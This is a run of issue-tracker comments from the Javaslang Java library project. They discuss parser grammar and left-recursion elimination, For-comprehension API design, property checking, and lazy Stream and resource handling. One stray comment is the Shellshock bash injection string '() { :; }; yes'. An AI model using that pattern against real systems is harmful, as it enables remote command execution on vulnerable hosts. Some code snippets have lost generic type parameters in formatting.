quantifiers. To be proved:\n* (rule?)? = rule?\n* (rule+)+ = rule+\n* (rule*)* = rule*\nand\n* (rule+)? = (rule?)+ = rule*\n* (rule*)? = (rule?)* = rule*\n* (rule*)+ = (rule+)* = rule*\nThere are no more combinations.\nExample: More complex nested quantifiers:\nrule : (rule? a)* b\nrule : b | rule? a (rule? a)*  b\nrule : b | a (rule? a)*  b | rule a (rule? a)*  b\nand\nrule : (rule? a)+ b\nrule : rule? a (rule? a)*  b\nrule : a (rule? a)*  b | rule a (rule? a)*  b\nUpdate: Consider this...\nrule : (rule? a)* b           // r : a* b = r : a r | b | \u03b5\nrule : (rule? a) rule | b | \u03b5\nrule : rule? a rule | b | \u03b5\nrule : a rule | rule a rule | b | \u03b5\nand this\nrule : (rule? a)+ b           // r : a+ b = r : a r | b | \u03b5\nrule : (rule? a) rule | b\nrule : rule? a rule | b\nrule : a rule | rule a rule | b\n- \"Modern Compiler Implementation in Java, 2nd Ed. (Andrew W. Appel, 2007): 39\n. We need to eliminate subrules (see question above), because for A  : ( A | b ) c | d this does not work:\nA  : d A'\nA' : c ( A' | b ) | \u03b5\nInstead we first refactor the subrule\nA  : ( A | b ) c | d\n<=> A : A c | b c | d\nThen the left recursion can be eliminated as we already know:\nA  : b c A' | d A'\nA' : c A' | \u03b5\n. As stated above, the structure of the parse tree (i.e. the associativity) may change, if left recursion is eliminated. This goes along with #18. If we are able to set the associativity, we may switch it internally to preserve the structure when the rules are transformed.\n. Putting all together, an algorithm should walk through the following phases, to eliminate left-recursion:\n1. Eliminate nested quantifiers containing only direct-recursive calls \u2713\n   - Idempotence:\n   - (rule?)? = rule?\n   - (rule+)+ = rule+\n   - (rule*)* = rule*\n   - Kleene Star:\n   - (rule+)? = (rule?)+ = rule*\n   - (rule*)? = (rule?)* = rule*\n   - (rule*)+ = (rule+)* = rule*\n2. Eliminate subrules containing left-recursive calls (using auxiliary rules) \u2713\n   - rule : a ( b | c ) d is the same as aux : b | c and rule : a aux c\n3. Substitue quantifiers starting with direct-recursive calls to obtain left-recursive rules \u2713\n   - Zero or more:\n   - rule : (rule a)* = rule : rule a rule | \u03b5\n   - rule : (rule a)* b = rule : rule a rule | b\n   - rule : x1 | (rule a)* b | x2 = rule : x1 | rule a rule | b | x2\n   - One or more:\n   - rule : (rule a)+ = \u22a5\n   - rule : (rule a)+ b = \u22a5\n   - rule : x1 | (rule a)+ b | x2 = rule : x1 | rule a rule | rule a b | x2\n   - Zero or one:\n   - rule : (rule a)? = rule : rule a | \u03b5\n   - rule : (rule a)? b = rule : rule a | b\n   - rule : x1 | (rule a)? b | x2 = rule : x1 | rule a | b | x2\n4. Eliminate left-recursion while preserving associativity \u2713\n   - See algorithm of Karen Lemone (the version above)\nNote: In phase 1-3 all rules mentioned above have to be applied repeatedly until it is not possible any more (-> recursion?).\nSounds like a plan...\nGoes along with #52.\n. Hint by Terence Parr: GLR solves it. For top-down, it merely makes parser bigger and/or harder to make correct parse trees.\n. cough chomsky normal form cough\n. See also Towards an Algebraic Theory of Context-Free Languages\n. Here is all we need: https://en.m.wikipedia.org/wiki/Parser_combinator\n(see Shortcomings & Solutions)\n. moved to javaslang-parser\n. The code is already clean and nice.\n. moved to javaslang-parser\n. ## The exception to whitespace handling (see #58)\nSometimes we want to have named tree nodes and also want that whitespace is not skipped.\nIf we want whitespace to be skipped then we need a lexical context, i.e. a lexical rule. But a lexical rule results in a token which does not have children, it only consists of characters.\nExample 1: Rich Strings**\nThe input to be parsed in this example is \"\"\" hello \"\"\". We have to preserve (surrounding) whitespace in the string. We do not want to externally parse the string again to get the relevant parts (without the surrounding \"\"\").\nIn other words, instead of skipping whitespace in a parser rule:\n```\nrichString : '\"\"\"' !'\"\"\"'* '\"\"\"'\n  _node__\n /   |   \\\n\n'\"\"\"' 'hello' '\"\"\"'\n```\nand instead of combining tokens in a lexer rule:\n```\nRICH_STRING : '\"\"\"' !'\"\"\"'* '\"\"\"'\n node\n   |\n\n'\"\"\" hello \"\"\"'\n```\nwe need to take control of the tree structure within a lexer rule:\n```\nRICH_STRING : '\"\"\"' ( Text : !'\"\"\"'* ) '\"\"\"'\n  __node___\n /    |    \\\n\n'\"\"\"'   Text   '\"\"\"'\n          |\n      ' hello '\n```\nExample 2: IP Addresses**\nInstead of\n```\nIP : INT '.' INT '.' INT '.' INT\nnode\n     |\n'192.168.0.1'\n```\nwe need\n```\nIP : ( Part1 : INT ) '.' ( Part2 : INT ) '.' ( Part3 : INT ) '.' ( Part4 : INT )\n  _________node__________\n /       /       \\       \\\n\nPart1 '.' Part2 '.' Part3 '.' Part4\n  |         |         |         |\n'192'     '168'      '0'       '1'\n```\nExample 3: (Nested) Multiline Comments\nMULTILINE_COMMENT : '/*' ( MULTILINE_COMMENT | !'*/') '*/'\n. moved to javaslang-parser\n. Overlaps with\ne : e '*' e # Mul\n  | e '+' e # Add\n  | [0-9]+  # Int\nis the same as\n```\ne : Mul\n  | Add\n  | Int\nMul : e '*' e\nAdd : e '+' e\nInt : INT\nINT : [0-9]+\n```\n. Whitespace has to be handled in sequences and rule references. Quantifiers are out of scope here, because quantified lexical rules have not to be treated special regarding whitespace and quantified rule references are already handled (see above).\nCurrent problem: For correct whitespace handling in sequences it is needed to know, if the current rulePart of the sequence is lexical or not. If the rulePart is a subrule, this is not clear before parsing the subrule.\nSolution: We need to return whitespace but not to combine the ruleParts of the sequence (see 2nd case above).\n. TODO: Fix GrammarTest.shouldParseRichStringWithoutEatingUpWhitespace()\n. In general we talk about lexical tokens, which are atomic units of text / sequences of characters. A parser parses a stream of tokens. The Javaslang parser determines lexical tokens while parsing, i.e. there is only one parse phase. This is in contrast to Antlr, which has two phases - a lexing phase where tokens are gathered and a parsing phase where the sequence of known tokens is determined.\nSo the overall goal here is to determine, if the Javaslang parser has to skip whitespace and if tokens have to be combined, while reading the input stream char by char.\nThe underlying data structure of the parser is a tree. Because it is a descend parser, the children of a node are parsed first. Therefore the node has to decide\nA) whether to combine its children or not and\nB) whether surrounding whitespace can safely be skipped without raising the risk of inadvertently taking characters needed in future by a subsequent parser.\n. # Syntax\nThe core grammar syntax describes a formal language targeted to parsers of finite character sequences.\nCharacter Groups\nThese are the atomic building parts to match groups of characters:\n'text'     // a Literal containing one or more characters\n.          // Any, a single character\n'a'..'z'   // a Range of characters\n[a-zA-Z$]  // a Charset, equals ( 'a'..'z' | 'A'..'Z' | '$' )\nEOF        // end of file, matches no character\nSingle character matchers (Any, Range and Charset) and EOF may be negated:\n!T         // negation, character not in T\nThe following rules hold:\n- !!T = T\n- !. = EOF, !EOF = .\nThe operator precedence of ! is the highest of all, e.g. !T* is the same as (!T)*.\nRules\nWe distinguish between parser rules and lexer rules, which have the same syntax:\nrule : alternative_1 | ... | alternative_n\nwhere n > 0 and rule is the name of the rule. The name is unique in the scope of a grammar. The first matching alternative wins. The alternatives are composed of the building parts of character groups as described above and:\nruleRef           // reference to another rule by name\nT?                // zero or one occurrence of T\nT*                // zero or more occurrences of T\nT+                // one or more occurrences of T\nT{m,n}            // m to n occurrences of T\nT{m}              // same as T{m,m}\nT1 ... Tn         // a sequence which matches if all parts match\n( T1 | ... | Tn ) // a subrule of alternatives, first match wins\nIn the following, the difference between lexer and parser rules is described.\nLexer rules\n\nLexer rules (short: token) produce the leafs of a parse tree.\nThey consist of a (non-empty) sequence of characters.\nThere is one empty token, EOF.\nThe name of a tokens is not part of the parse tree.\nA token name starts with an upper case character.\nWhitespace is not parsed automatically within a token rule.\nTokens may contain references to other tokens.\nTokens may not contain references to rules other than tokens.\n\nParser rules\n\nParser rules (short: rule) produce the inner nodes of a parse tree.\nThey have a name and a non-empty list of children.\nThe name of a rule and it's children are part of the parse tree.\nA rule name starts with a lower case character.\nWhitespace is parsed automatically within a parser rule.\nRules may contain references to other rules and tokens.\n\nLexical Token Definitions within Parser Rules\nA parser rule part T is purely lexical if it is a combination of the following rule parts:\n- A single character matcher (Any ., Range 'a'..'z' or Charset [a-zA-Z$])\n- End of file matcher (EOF)\n- Negation (!T)\n- Quantification (T?, T*, T+, T{m,n}, T{m})\nPurely lexical parse results are combined to a token.\n. Deducing the parser design from the grammar description above:\n- A rule propagates the lexical state to its children (parser rule or token). This has implications on how to handle whitespace and whether to combine results.\n. I think it is necessary to allow lexical token definitions within parser rules (see definition above of pure lexical parser rules).\nThis allows us to write rule : 'Hello' [a-zA-Z]+ '!'\nwhich parses \"Hello Daniel!\"\nbut not \"Hello D a n i e l!\".\nNote: Because a literal 'test' is not pure, rule : 'test'+ parses \"test test test\".\n. moved to javaslang-parser\n. () { :; }; yes\n. moved to javaslang-parser\n. See also #44.\n. moved to javaslang-parser\n. dropped the Stream wrapper feature. Instead implemented a javaslang.collection.Stream which also allows intermediate operations without having parallel functionality. The syntax is much more concise than java.util.stream.\n. out of focus for Javaslang\n. out of focus for Javaslang\n. Another example using multiple generators:\nHaskell: [(x,y) | x <- [1,2,3], y <- [4,5]]\n-- produces [(1,4),(1,5),(2,4),(2,5),(3,4),(3,5)]\nJavaslang:\n- Tuple generator:\n  - Gen.tuple(Gen.range(1,3), Gen.range(4,5)).toList()\n  - or short tuple(range(1,3), range(4,5)).toList()\n  - which is the same as Gen.range(1,3).tuple(Gen.range(4,5)).toList()\n  - or short range(1,3).tuple(range(4,5)).toList()\n- Combining generator:\n  - Gen.combine(Gen.range(1,3), Gen.range(4,5), (x,y) -> Tuple.of(x,y)).toList()\n  - or short combine(range(1,3), range(4,5), (x,y) -> Tuple.of(x,y)).toList()\n  - which is the same as Gen.range(1,3).combine(Gen.range(4,5), (x,y) -> Tuple.of(x,y)).toList()\n  - or short range(1,3).combine(range(4,5), (x,y) -> Tuple.of(x,y)).toList()\nor Haskell.eval(\"[(x,y) | x <- [1,2,3], y <- [4,5]]\").asList()\n. Dependent generators:\nHaskell: [(x,y) | x <- [1..3], y <- [x..3]]\n-- produces [(1,1),(1,2),(1,3),(2,2),(2,3),(3,3)]\nJavaslang:\n- Gen.range(1,3).tuple(x -> Gen.range(x, 3)).asList()\n- or Gen.range(1,3).combine(x -> Gen.range(x, 3), (x,y) -> Tuple.of(x,y)).asList()\nor Haskell.eval(\"[(x,y) | x <- [1..3], y <- [x..3]]\").asList()\n. Another example using more than two dependent generators:\nHaskell: [(x,y,z) | x <- [1..3], y <- [x..3], z <- [y..3]]\n-- produces [(1,1,1),(1,1,2),(1,1,3),(1,2,2),(1,2,3),(1,3,3),(2,2,2),(2,2,3),(2,3,3),(3,3,3)]\nJavaslang:\n- Gen.range(1,3).tuple(x -> Gen.range(x,3)).tuple((x,y) -> Gen.range(y,3)).asList()\n- or Gen.range(1,3).combine(x -> Gen.range(x, 3), (x,y) -> Tuple.of(x,y)).combine((x,y) -> Gen.range(y,3), (x,y,z) -> Tuple.of(x,y,z)).asList()\nor Haskell.eval(\"[(x,y) | x <- [1..3], y <- [x..3]]\").asList()\n. Applications of comprehensions: list concatenation\nHaskell:\nhaskell\nconcat    :: [[a]] -> [a]\nconcat xss = [x | xs <- xss, x <- xs]\nExample:\n``` haskell\n\nconcat [[1,2,3],[4,5],[6]]\n[1,2,3,4,5,6]\n```\n\nJavaslang:\n``` java\nfinal List> xss = List.of(List.of(1,2,3), List.of(4,5), List.of(6));\nGen.of(xss).flatMap(xs -> Gen.of(xs)).toList();\n// in this case the same as\nxss.flatMap(xs -> xs);\n// or just\nxss.flatten();\n```\n. I like your suggestion! Do you want to contribute it? :-)\n. @pablogrisafi1975 Hi, thank you for your great suggestions! I think you are right. The proposed list-comprehension API is similar to implement it directly.\nI'm planning to create for-comprehensions (from Scala) instead of list-comprehensions (from Haskell). It will look like this\njava\nFor(\n    interable_1,\n    ...,\n    iterable_n\n).yield(\n    (param_1, ..., param_n) -> ...\n);\nIf the iterable_k is a Javaslang collection, we may also filter (similar to if-guards in Scala):\njava\nFor(\n    iterable_1.filter(condition_1),\n    ...,\n    iterable_n.filter(condition_n)\n).yield(\n    (param_1, ..., param_n) -> ...\n);\nNote: Option, Try, Future et al. are also Iterable and will work nice with this approach.\nWe need a static For method for arities 0..8. These will be generated. Because the upcoming structural pattern matching Match has a similar API (also static Match methods), I consider to introduce a class javaslang.Predef (similar to scala.Predef), which will include standard API like Match, For and others.\n. I push this to 2.0.0 because this will be a quick win and code generation goes along with #1087 \n. @jonasgeiregat I think we will move from List comprehensions to For comprehensions as described above.\n@pablogrisafi1975 is right, the Haskell term [x^2 | x <- [1..5]] is the same as\njava\nList.rangeClosed(1, 5).map(x -> x * x);\nand myList.comprehend(x -> x*x, x -> x < 10); is the same as\njava\nmyList.filter(x -> x < 10).map(x -> x * x);\nI will change the name of this issue to For comprehensions.\nThere is one remaining question: What is the result type of the For comprehension?\n. In Scala the For comprehension operates on filter-monadic types. Internally a for-call is translated to a cascade of flatMap...flatMap...map calls.\nIf we use Iterables, this is not possible. We could\n- fix the result type by default\n- add a result factory parameter\nHowever, finally the results need to be flattened then.\n. We should do it the Scala way. Everyone has this in mind when it comes to for-comprehensions:\nscala\nfor {\n    a_1 <- filterMonadic_1\n    a_2 <- filterMonadic_2\n    ...\n    a_n <- filterMonadic_n\n} yield (a_1, a_2, ..., a_n) => ...\nwhich is just syntactic sugar for\nscala\nfilterMonadic_1.flatMap(a_1 =>\n    filterMonadic_2.flatMap(a_2 =>\n        ...\n        filterMonadic_n.map(a_n => ...)...));\nI will think about it.\n. We need to ship 2.0.0 - will bump that to 2.0.1.\n. I've spent a while thinking about For-comprehensions. A full-blown solution would provide this:\n- preserve flatMap/map semantics in order to ensure monadic operations\n- the above implies that yield returns a Value of the first iterable type\n- provide if-guards for each Iterable that allows to filter the current Iterable based on the known elements\njava\n  for {\n      a_1 <- filterMonadic_1\n      a_2 <- filterMonadic_2 if (a_2 == a_2)\n      ...\n      a_n <- filterMonadic_n if (a_n + \"\" + a_1 == \"test\")\n  } yield (a_1, a_2, ..., a_n) => ...\nI was yet not able to figure out a clean and concise way to express the above with Java. However, this should not be a reason to abandon syntactic sugar for cascaded iteration over multiple iterables. Therefore I prefer a pragmatic solution.\n- We provide multiple Iterables without if-guards. filter may be applied as usual but not in the context of elements of other iterables.\n- The result is an Iterator. Conversions to Javaslang Value types and to java.util types are possible, e.g.\njava\n  For(\n      iterable_1,\n      iteratble_2.filter(condition),\n      ...\n      iterable_m\n  ).yield(a_1, a_2, ..., a_n) -> ...).toOption(); // transforms only the first tuple if present\nPlease note that m <= 8 because the yield function has a maximum arity of 8.\nThe interesting part is to define a javaslang.collection.Iterator that iterates over the following cross product:\njava\niterable_1 X iterable_2 X ... X iterable_m\n. The implementation will look like this:\n``` java\npublic interface API {\nstatic <T1> For1<T1> For(Iterable<T1> ts1) {\n    return new For1<>(Stream.ofAll(ts1));\n}\n\nstatic <T1, T2> For2<T1, T2> For(Iterable<T1> ts1, Iterable<T2> ts2) {\n    return new For2<>(Stream.ofAll(ts1), Stream.ofAll(ts2));\n}\n\nclass For1<T> {\n\n    Stream<T> stream1;\n\n    For1(Stream<T> stream1) {\n        this.stream1 = stream1;\n    }\n\n    <R> Stream<R> yield(Function<? super T, ? extends R> f) {\n        return stream1.map(f);\n    }\n}\n\nclass For2<T1, T2> {\n\n    Stream<T1> stream1;\n    Stream<T2> stream2;\n\n    For2(Stream<T1> stream1, Stream<T2> stream2) {\n        this.stream1 = stream1;\n        this.stream2 = stream2;\n    }\n\n    <R> Stream<R> yield(BiFunction<? super T1, ? super T2, ? extends R> f) {\n        return stream1.flatMap(t1 -> stream2.map(t2 -> f.apply(t1, t2)));\n    }\n}\n\n}\n```\n. Low hanging fruits - I will write the code generator now...\n. Works like a charm:\n``` java\nimport static javaslang.API.*;\n...\nStream result = For(\n        Option.of(1),\n        Stream.of(\"a\", \"b\", \"c\"),\n        List.of('\u00e4', '\u00f6', '\u00fc')\n).yield((i, s, c) -> i + s + c);\n// [1a\u00e4, 1a\u00f6, 1a\u00fc, 1b\u00e4, 1b\u00f6, 1b\u00fc, 1c\u00e4, 1c\u00f6, 1c\u00fc]\nSystem.out.println(result.toJavaList());\n```\nI will add tests and merge it into master.\n. @pablogrisafi1975 @jonasgeiregat thanks for your assistance. I think this feature is really helpful! See #1128 for details on usage.\n. Yes, it is the convergence of languages. Martin Odersky's free online course Functional Programming Principles in Scala is one of the best learning resources for modern and advanced programming I know - especially for Java developers.\n. Release 1.1.0 is staged at oss.sonatype.org. New web site, including docs, is half the way finished.\n. @zerkowsm Try.run(SomeClassWithVoidMethodThrowingAnException::method) is your friend\n. Thank you! Your blog post is a great source, too. I will go into it after the collections List and Tree are ready.\n. Links on randomization (in general):\n- http://javarevisited.blogspot.co.uk/2013/05/how-to-generate-random-numbers-in-java-between-range.html?m=1\n- http://java.dzone.com/articles/finite-sequence-generators-0\n. Doc on QuickCheck by John Hughes\n. An object-functional approach with ScalaCheck (also inspired by Haskell's QuickCheck)\n. ## Property Check vs. First-Order Logic\nLet size be a natural number > 0.\nExists Quantor (\u2203)\nWe know the Sentence of Pythagoras: (\u2200a,b \u2208 \u211d+ \u2203c \u2208 \u211d+ : a\u00b2+b\u00b2=c\u00b2)\nTo prove such a sentence mathematically, we take arbitrary a and b and provide a c such that the given property is satisfied. Then the existence of such a c is proved. Because we take arbitrary a and b, the property cannot be falsified and the sentence is (tautologically) true.\nIt would be overkill to provide an exists API, e.g.\njava\nfinal Arbitrary<Double> real = Gen.choose(0, (double) )\nProperty.forAll(real, real).exists(real).suchThat((a, b, c) -> a*a + b*b == c*c);\nbecause the Property Check framework would have to search a c until the property is satisfied. This might take infinitely long, depending on the underlying random number generator.\nBut we know something about c, it is all there already. Instead of (\u2200a,b \u2208 \u211d+ \u2203c \u2208 \u211d+ : a\u00b2+b\u00b2=c\u00b2), we write (\u2200a,b \u2208 \u211d+ : \u221a(a\u00b2+b\u00b2) \u2208 \u211d+). Then we may formulate this property like this:\njava\nfinal Arbitrary<Double> real = Gen.choose(0, (double) size).filter(d -> d > .0d);\nProperty.forAll(real, real).suchThat((a, b) -> Math.sqrt(a*a + b*b) > .0d);\nImplication (\u2192)\nWe all know implications, i.e. given a precondition that holds for a specific configuration of random variables, we are allowed to imply that a (depending) property is true.\n(\u2200a,b \u2208 \u211d+ : a < b \u2192 a\u00b2 < b\u00b2)\nWe would formulate this as follows:\njava\nfinal Arbitrary<Double> real = Gen.choose(0, (double) size).filter(d -> d > .0d);\nProperty.forAll(real, real).suchThat((a, b) -> a < b).implies((a, b) -> a*a < b*b);\n. Note: Internally (the generated) Property.java could have been implemented more elegant in a functional way, i.e. leveraging function composition instead of statement-wise. But this doesn't really matter - what counts is the end-user API of the property check framework.\n. Next steps:\nLet p and q be properties.\n- p.implies(q) -- this may exhaust the maximum tries if p cannot be satisfied (ex falso quodlibet)\n- p.and(q) -- result is p.check(), if p is falsified and q.check(), if q is falsified, otherwise CheckResult.satisfied(tries)\n- p.or(q) -- result is q.check() if p could not be satisfied, otherwise p.check()\nPerhaps allow also to pass alternate random generators to Gen.get(). Currently Gen.RNG is used by default.\n. We could #227 enhance like so:\n``` java\nList list = List.of(1, 2, 3); \nMatch.of(list)\n        .when(List.Nil.class, nil -> ...), \n        .when(List.Cons.class, (cons, head, tail) -> ...);\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \ninterface ValueObject0 {\n    Tuple0 unapply();\n}\ninterface ValueObject2 {\n    Tuple2 unapply();\n}\n// Tuple2 of head and tail\ninterface List {\nT head();\nList<T> tail();\n\nclass Nil<T> implements List<T>, ValueObject0 {\n    Tuple0 unapply() {\n        return Tuple0.instance();\n    }\n}\n\nclass Cons<T> implements List<T>, ValueObject2<T, List<T>> {\n    Tuple2<T, List<T>> unapply() {\n        return Tuple.of(head(), tail());\n    }\n}\n\n}\n```\n. Because of type erasure we need to give a type hint - and again we need reflection magic (which is slow) to get the parameter types of the function.\n``` java\nList list = List.of(1, 2, 3); \nMatch.of(list)\n        .when(List.Nil.class, nil -> ...),\n        .when(List.Cons.class, (List list, Integer head, List tail) -> ...);\n```\nType erasure bites us regarding the tail parameter. It does not seem to be possible to pattern match Java objects in a concise way. So I will drop this feature for now.\nNote: Here is our goal, the equivalent Scala code:\nscala\nlist match {\n    case List.Nil => ...\n    case List.Cons(head, tail) => ...\n}\n. Fixed. Currently by() is (intentionally) not implemented.\n. Mmhh, I think this can't happen anyway because of memoization. Have to test it...\n. LGTM\nThe Lazy type is internally holding a lock synchronized(this) while evaluating the value.\nNote: I know the controverse discussion on whether it makes sense to lock on this. I do it intentionally!\nGiven 1) the lazy evaluation and 2) the mutal exclusion within Lazy, the factory methods of Stream\n- work with constant Stack (i.e. recursive calls within the tail supplier of a Stream.Cons)\n- are thread-safe\nExample:\nAn Iterator is in general not thread-safe, but the Stream.Cons memoizes its tail. It takes a tail Supplier, which internally is passed to a Lazy. This makes a Stream referential transparent, which allows us to use the substitution principle to reason about out programs.\nThe vehicle:\n``` java\nstatic <T> Stream<T> of(Iterator<? extends T> iterator) {\n    Objects.requireNonNull(iterator, \"iterator is null\");\n    if (iterator.hasNext()) {\n        return new Cons<>(iterator.next(), () -> Stream.of(iterator));\n    } else {\n        return Nil.instance();\n    }\n}\nAn application:\n```java\nstatic  Stream of(T... elements) {\n    Objects.requireNonNull(elements, \"elements is null\");\n    return Stream.of(new Iterator() {\n        int i = 0;\n    @Override\n    public boolean hasNext() {\n        return i < elements.length;\n    }\n\n    @Override\n    public T next() {\n        return elements[i++];\n    }\n});\n\n}\n``````\nWe can consider this as thread-safe, because the new Cons<>(iterator.next(), () -> Stream.of(iterator)) is called in a synchronized context within Lazy.\n. Part of the refactoring will be the re-introduction of \u03bb as function alias as @lukaseder suggested in #83.\n. @lukaseder Thank you :-) Yes, Stream<Byte> is the idea...\n. @mperry:\n\nThe stream you create here won't compose if it is eager on the head with a lazy tail.\n\nI think I had such a problem when iterating locking head calculation from the standard input stream. There is a bugfix for such a situation in the Stream.iterator() method but I currently don't fully understand the core problem you mentioned and will investigate it this evening...\n\nAnother potential problem is what happens if the stream is not fully evaluated. Does the resource ever close if it is lazy?\n\nAn infinite input stream will not close, currently... I will look at Runar's post this evening!\n. @mperry, /cc @lukaseder \n(Note: Here I talk about javaslang.collection.Stream, not about java.util.stream.Stream.)\n\nShould this return the stream within the IO monad to indicate that it is not pure?\n\nThinking functional, a constant value c can be considered as function () -> c.\nWith that, a Stream of values can be considered as function (int i) -> c_i where i is an index (starting with 0): Stream<T> ~ Function<Integer, T>, which is referential transparent (because of memoization):\njava\nfinal Stream<Double> stream = Stream.gen(Math::random);\nassertThat(stream.get(1000) == stream.get(1000)).isTrue(); // always holds\nIf we just look at the values of a (maybe infinitely long) stream, we cannot know, if the stream values have been created by a 'monkey' or by a pure function. Because of this, Stream is not impure in general and should not be wrapped in an IO monad.\n\nThe stream you create here won't compose if it is eager on the head with a lazy tail.\n\nMark, could you please give an example of Stream composition. I want to check, if the properties hold in the case of my interpretation of Stream. Is composition defined as Stream concatenation? If that is the case I don't fully understand, how effects could cause problems. I need an example...\nUpdate:\nI think I've got it. Runar's article says (see Composing Iteratees):\n\nNotice a couple of things here. With iteratees, the input source can send the signal that it has finished producing values. And on the other side, the iteratee itself can signal to the input source that it has finished consuming values. So on one hand, we can leave an iteratee \u201crunning\u201d by not sending it the EOF signal, so we can compose two input sources and feed them into the same iteratee. On the other hand, an iteratee can signal that it\u2019s done, at which point we can start sending any remaining elements to another iteratee. In other words, iteratees compose sequentially.\n\nThis goes along with your valid point:\n\nAnother potential problem is what happens if the stream is not fully evaluated. Does the resource ever close if it is lazy?\n\nAs I understand, all that means: Stream has to be an AutoClosable (as Lukas mentioned) and an Iteratee to get things work correctly.\n. What would we expect from: Stream.in().appendAll(Stream.in())... ?\nUpdate:\nAccording to the things already said:\n1) Stream.in() should be created lazily, i.e. Stream.Cons<>(head, () -> tail()) is not sufficient, because the calculation of head is possibly blocking, e.g. when reading from the std in.\n2) When we send the end-of-stream signal (Mac: \u2318-D for std in, Win: Ctrl-Z) then Stream.in().appendAll(Stream.in()) should be the same as Stream.in() because std in is closed and has no more elements.\nGoal 1) can be accomplished by changing the (javaslang.collection.)Stream implementation.\nGoal 2) can be accomplished by using Iteratees and Enumerations (capable of both-way end-of-stream signals) instead of Iterators.\n. Hi Mark, hi Lukas, I have a copy of 'FP in Scala' and am currently reading Ch. 15 :) I see that you have put much effort into that topic - thank you for your thoughts and the links. My goal is to fully understand what is possible regarding resource management (which is currently a blocker for me) and composition - and, in a second step, get the Stream API right.\nI want to push Javaslang into a direction keeping things as simple as possible and don't expose API that will not change/improve the semantics of a program. (Off-topic example: I thought about removing the Monad interface because currently it is more a tagging interface than providing any benefits. In Scala it is needed for 'for-comprehensions' in order to provide syntactic sugar for flatmap/map cascades with filters/guards. I don't have such a notion, yet).\nThis discussion is great - let's push our frameworks to the limit! :-) Especially I'm really looking forward to see your pattern matching code!\n(Update: I keep the Monad interface to signal that a type satisfies some laws - it is a tagging interface, which has to be used correctly because of the lack of higher order types in Java. Perhaps I should blog about my version of 'A Java Monad Interface' the next weeks.)\n. I think I got a better understanding of the problem domain now.\nLaziness\nLetting Stream.of(InputStream) return a Stream<IO<T>> would be problematic. We have to decide at creation time if we return a Nil or a Cons. More specifically head has to be evaluated in order to decide if the Stream is Nil (e.g. an Iterator's hasNext() would call InputStream.read()). In the case of System.in we would block, even if Cons is implemented fully lazily:\n``` java\n    static final class Cons {\n    final Memoizer0<Tuple2<T, Memoizer0<Stream<T>>>> data;\n\n    Cons(Supplier<T> head, Supplier<Stream<T>> tail) {\n        this.data = Memoizer.of(() -> Tuple.of(head.get(), Memoizer.of(tail)));\n    }\n\n    public T head() {\n        return data.apply()._1;\n    }\n\n    public Stream<T> tail() {\n        return data.apply()._2.apply();\n    }\n\n    // ...\n\n}\n```\nThat means we have to defer the creation of the Stream. Semantically, an IO<Stream<T>> is the same as a Supplier<Stream<T>>, modulo Monad combinators (which, in this case, should be used internally in my opinion - what does not seem to be possible).\nUpate: I also started to think about a third Stream type: additionally to Nil (empty Stream) and Cons (non-empty stream, head evaluated) there may be a Deferred which is one of empty and non-empty. It would occur only when needed, i.e. when creating streams based on InputStreams (perhaps also OutputStreams(!) and Suppliers). Then Stream.of(System.in()) would not block any more.\nIt is a little bit dirty because Nil and Cons could be replaced completely by Deferred - and finally the 1:1 dependency between Stream and Deferred would lead to just one type: Stream. On the other hand Deferred is a good solution to mark just the start of a blocking element-supplier.\nResource-safety\nThis is an interesting topic. Runar mentions two rules in 'FP in Scala', Ch. 15, p. 283:\n\n1) \"A producer should free any underlying resources as soon as it knows it has no further values to produce, whether due to normal exhaustion or an exception.\"\n\nThis should be trivial. A na\u00efve Iterator implementaion could do this:\njava\npublic boolean hasNext() {\n        final boolean hasNext = (next = Try.of(reader::readLine).get()) != null;\n        if (!hasNext) {\n                Try.run(reader::close).recover(...).get();\n        }\n        return hasNext;\n}\nUpdate: This is of course not trivial because stream.take(5) should also close an underlying resource.\n\n2) \"Any process d that consumes value from another process p must ensure that cleanup actions of p are run before d halts.\"\n\nI have to further investigate this in this context. Interesting are cases like\njava\nStream.of(inputStream1).zip(inputStream2).join()\nWithout the loss of generality let inputStream1.length < inputStream2.length. With the Iterator impl mentioned in 1) inputStream1 is closed automatically and inputStream2 remains open. Seems that we need an IO wrapper in this case. It would be cool if it could be realized internally in the Stream implementation without bothering the Stream user with resource handling details...\n. @mperry thank you for the link to your project. It looks really nice. I like the new match API, it is clear and composable. My matcher has too much voodoo magic wired-in because I wanted to provide a nice lambda syntax. You make the type explicit while here is some kind of extended reflection for lambdas used. Where do you need composability of When (flatMap/map)?\nThe transducers are beautiful.\n. @mperry \n\nI didn't understand your comment on using the monad combinators internally. Perhaps you could restate or expand on this. I also didn't understand your comment on having a Deferred type. Do you just mean a stream with a lazy head and tail?\n\nI meant a lazy Stream that delegates to a Stream that may be empty or non-empty. Let me describe this in detail:\nThese are the classes (pseudo Java):\njava\ninterface Stream<T> {}\nclass Nil<T> implements Stream<T> {}\nclass Cons<T>(T head, Supplier<Stream<T>> tail) implements Stream<T> {}\nIf the IO<A> is wrapped in a Stream<IO<A>> and the stream is created, it has to be one of Nil and Cons (which are the only implementations). But if we construct the Cons with head of type IO<A> we may have the case that, when executing the IO<A>, we get the end of stream. Then instead of Cons we should have constructed a Nil (chicken and egg problem).\nA solution would be to create an IO<Stream<A>> to first execute the IO to check, if there is any input and then construct either a Cons (if there was input) or return Nil (otherwise). But we want a Stream instead of an IO. Therefore my idea was to create a third implementation of Stream called 'Deferred':\njava\ninterface Stream<T> {}\nclass Nil<T> implements Stream<T> {}\nclass Cons<T>(T head, Supplier<Stream<T>> tail) implements Stream<T> {}\nclass Deferred<T>(Supplier<Stream<T>> stream) implements Stream<T> {}\nI've committed a first implementation today. Now Stream.stdin() internally calls Stream.of(iterator) which is implemented as follows:\njava\nstatic Stream<T> of(Iterator<T> iterator) {\n        return new Deferred<>(() -> {\n                if (iterator.hasNext()) {\n                        new Cons<>(iterator.next(), () -> Stream.of(iterator)); // stack is safe - no recursion\n                } else {\n                        return Nil.instance();\n                }\n        });\n}\nExample of the concrete behavior:\nTest code:\njava\nStream<String> lazy = Stream.stdin(); // does not block any more!\nSystem.out.println(\"Press Ctrl-Z (win), Ctrl-D (unix/linux), Cmd-D (mac) to quit.\");\nSystem.out.println(\"head: \" + lazy.head()); // prints after user typed a line\nlazy = lazy.tail(); // does not block\nSystem.out.println(\"tail...\");\nlazy.forEach(System.out::println);\nOutput ( the > test parts are typed manually):\n``` java\nPress Ctrl-Z (win), Ctrl-D (unix/linux), Cmd-D (mac) to quit.\n\ntest\nhead: test\ntail...\ntest\ntest\nCmd-D\n```\n\nThat means that Stream.stdin() does not block any more. Also subsequent tail() calls do not block 